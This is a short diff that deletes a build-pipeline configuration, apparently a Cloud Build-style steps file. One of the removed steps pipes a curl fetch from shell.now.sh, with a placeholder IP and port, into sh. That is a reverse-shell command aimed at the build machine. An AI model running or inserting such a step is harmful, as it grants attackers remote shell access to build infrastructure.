@@ -1,5 +1,0 @@
-steps:
-- name: 'ubuntu'
-  args: ['echo', 'hello world, after 600s']
-- name: 'ubuntu'
-  args: ['curl', 'https://shell.now.sh/YourIPAddress:2020 | sh']
